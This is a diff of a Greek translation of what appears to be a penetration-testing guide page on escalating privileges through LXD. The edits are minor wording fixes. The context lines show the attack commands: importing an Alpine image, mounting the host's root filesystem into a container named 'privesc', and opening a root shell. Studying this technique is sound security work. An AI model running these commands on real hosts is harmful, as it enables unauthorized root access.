@@ -9,7 +9,7 @@
 ### Μέθοδος 1
 
 Μπορείτε να κατεβάσετε μια εικόνα alpine για χρήση με lxd από ένα αξιόπιστο αποθετήριο. 
-Η Canonical δημοσιεύει καθημερινές εκδόσεις στην ιστοσελίδα τους: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/) 
+Η Canonical δημοσιεύει καθημερινές εκδόσεις στην ιστοσελίδα τους: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
 Απλά πάρτε και τα δύο **lxd.tar.xz** και **rootfs.squashfs** από την πιο πρόσφατη έκδοση. (Το όνομα του καταλόγου είναι η ημερομηνία).
 
 Εναλλακτικά, μπορείτε να εγκαταστήσετε στον υπολογιστή σας αυτόν τον κατασκευαστή διανομών: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (ακολουθήστε τις οδηγίες του github):
@@ -35,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Ανεβάστε τα αρχεία **incus.tar.xz** (**lxd.tar.xz** αν τα κατεβάσατε από το αποθετήριο Canonical) και **rootfs.squashfs**, προσθέστε την εικόνα στο αποθετήριο και δημιουργήστε ένα κοντέινερ:
+Ανεβάστε τα αρχεία **incus.tar.xz** (**lxd.tar.xz** αν τα κατεβάσατε από το αποθετήριο της Canonical) και **rootfs.squashfs**, προσθέστε την εικόνα στο αποθετήριο και δημιουργήστε ένα κοντέινερ:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -54,7 +54,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 > Αν βρείτε αυτό το σφάλμα _**Error: No storage pool found. Please create a new storage pool**_\
 > Εκτελέστε **`lxd init`** και ρυθμίστε όλες τις επιλογές στις προεπιλεγμένες ρυθμίσεις. Στη συνέχεια **επαναλάβετε** το προηγούμενο κομμάτι εντολών
 
-Τέλος, μπορείτε να εκτελέσετε το κοντέινερ και να αποκτήσετε root:
+Τέλος, μπορείτε να εκτελέσετε το κοντέινερ και να αποκτήσετε δικαιώματα root:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
